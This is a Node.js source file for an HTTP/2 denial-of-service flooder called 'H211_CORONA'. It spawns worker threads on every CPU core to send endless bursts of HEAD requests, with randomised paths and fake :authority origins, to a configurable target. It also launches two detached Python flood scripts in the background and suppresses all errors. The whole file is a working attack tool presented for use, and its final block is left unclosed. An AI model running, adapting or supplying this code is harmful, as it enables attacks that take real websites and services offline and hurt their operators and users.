const http2 = require('http2');
const { Worker, isMainThread } = require('worker_threads');
const { spawn } = require('child_process');
const fs = require('fs');

// ================= CONFIG =================
const TARGET = "https://example.com"; // CHANGE THIS
const H1INF_PY = "H1INF.py";
const H1FD_PY = "H1FD.py";
const LOG_INTERVAL = 10000; // 10 seconds
// ==========================================

class H211_CORONA {
    constructor() {
        this.totalReqs = 0n;
        this.lastLog = Date.now();
        this.running = true;
        this.workers = [];
        
        // ASCII launcher
        this.launcher = "     ▄︻デ╦═一━";
        
        // Generate random data
        this.endpoints = this.genEndpoints(500);
        this.origins = this.genOrigins(50);
        
        // Start
        this.start();
    }
    
    genEndpoints(count) {
        const eps = [];
        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789-_';
        for (let i = 0; i < count; i++) {
            let path = '/';
            const depth = Math.floor(Math.random() * 4) + 1;
            for (let d = 0; d < depth; d++) {
                let seg = '';
                const len = Math.floor(Math.random() * 8) + 3;
                for (let c = 0; c < len; c++) {
                    seg += chars[Math.floor(Math.random() * chars.length)];
                }
                path += seg + '/';
            }
            path = path.slice(0, -1);
            
            if (Math.random() > 0.3) {
                const params = Math.floor(Math.random() * 3) + 1;
                path += '?';
                for (let p = 0; p < params; p++) {
                    const klen = Math.floor(Math.random() * 6) + 2;
                    const vlen = Math.floor(Math.random() * 8) + 1;
                    let key = '', val = '';
                    for (let k = 0; k < klen; k++) key += chars[Math.floor(Math.random() * 36)];
                    for (let v = 0; v < vlen; v++) val += chars[Math.floor(Math.random() * 36)];
                    path += key + '=' + val;
                    if (p < params - 1) path += '&';
                }
            }
            eps.push(path);
        }
        return eps;
    }
    
    genOrigins(count) {
        const orgs = [];
        const prefs = ['api', 'cdn', 'static', 'assets', 'data'];
        const doms = ['com', 'net', 'org', 'io', 'app'];
        for (let i = 0; i < count; i++) {
            const pref = prefs[Math.floor(Math.random() * prefs.length)];
            const num = Math.floor(Math.random() * 999);
            const dom = doms[Math.floor(Math.random() * doms.length)];
            orgs.push(`${pref}${num}.${dom}`);
        }
        return orgs;
    }
    
    spawnPython(script) {
        if (fs.existsSync(script)) {
            const proc = spawn('python3', [script], {
                detached: true,
                stdio: 'ignore'
            });
            proc.unref();
        }
    }
    
    createWorker() {
        const workerCode = `
            const http2 = require('http2');
            const { workerData } = require('worker_threads');
            
            const endpoints = workerData.endpoints;
            const origins = workerData.origins;
            const target = workerData.target;
            
            // Create connections
            const conns = [];
            for (let i = 0; i < 3; i++) {
                try {
                    const client = http2.connect(target, {
                        maxSessionMemory: 512 * 1024
                    });
                    client.on('error', () => {});
                    conns.push(client);
                } catch(e) {}
            }
            
            function attack() {
                for (const client of conns) {
                    if (client.destroyed) continue;
                    for (let i = 0; i < 25; i++) {
                        try {
                            const req = client.request({
                                ':method': 'HEAD',
                                ':path': endpoints[Math.floor(Math.random() * endpoints.length)],
                                ':authority': origins[Math.floor(Math.random() * origins.length)]
                            });
                            req.on('response', () => {
                                req.close();
                                if (process.send) process.send(1);
                            });
                            req.on('error', () => {
                                req.close();
                                if (process.send) process.send(1);
                            });
                            req.end();
                        } catch(e) {}
                    }
                }
                setImmediate(attack);
            }
            
            attack();
        `;
        
        const worker = new Worker(workerCode, {
            eval: true,
            workerData: {
                endpoints: this.endpoints,
                origins: this.origins,
                target: TARGET
            }
        });
        
        worker.on('message', (count) => {
            this.totalReqs += BigInt(count);
        });
        
        worker.on('error', () => {});
        worker.on('exit', () => {});
        
        return worker;
    }
    
    start() {
        // Start Python
        this.spawnPython(H1INF_PY);
        this.spawnPython(H1FD_PY);
        
        // Create workers
        const cores = Math.max(1, require('os').cpus().length);
        for (let i = 0; i < cores; i++) {
            this.workers.push(this.createWorker());
        }
        
        // Start logging
        this.startLogging();
        
        // Minimal main thread attack
        this.lightAttack();
    }
    
    lightAttack() {
        try {
            const client = http2.connect(TARGET);
            client.on('error', () => {});
            
            const attack = () => {
                if (!this.running) return;
                try {
                    const req = client.request({
                        ':method': 'HEAD',
                        ':path': this.endpoints[Math.floor(Math.random() * this.endpoints.length)],
                        ':authority': this.origins[Math.floor(Math.random() * this.origins.length)]
                    });
                    req.on('response', () => {
                        req.close();
                        this.totalReqs++;
                    });
                    req.on('error', () => {
                        req.close();
                        this.totalReqs++;
                    });
                    req.end();
                } catch(e) {}
                setImmediate(attack);
            };
            
            attack();
        } catch(e) {}
    }
    
    startLogging() {
        setInterval(() => {
            const formatted = this.totalReqs.toLocaleString('en-US');
            process.stdout.write(`\r\x1b[35mM2M11\x1b[0m${this.launcher} ---> \x1b[32m${formatted}\x1b[0m`);
        }, LOG_INTERVAL);
    }
    
    stop() {
        this.running = false;
        this.workers.forEach(w => {
            try { w.terminate(); } catch(e) {}
        });
        try {
            require('child_process').execSync(`pkill -f "${H1INF_PY}"`);
            require('child_process').execSync(`pkill -f "${H1FD_PY}"`);
        } catch(e) {}
    }
}

// Main
if (isMainThread) {
    // Silence all startup logs
    const originalLog = console.log;
    console.log = () => {};
    
    const corona = new H211_CORONA();
    
    // Restore console.log after startup
    setTimeout(() => {
        console.log = originalLog;
    }, 100);
    
    // Shutdown
    process.on('SIGINT', () => {
        corona.stop();
        process.exit(0);
    });
    
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
    
    // Memory
    require('v8').setFlagsFromString('--max-old-space-size=4096');
                    }
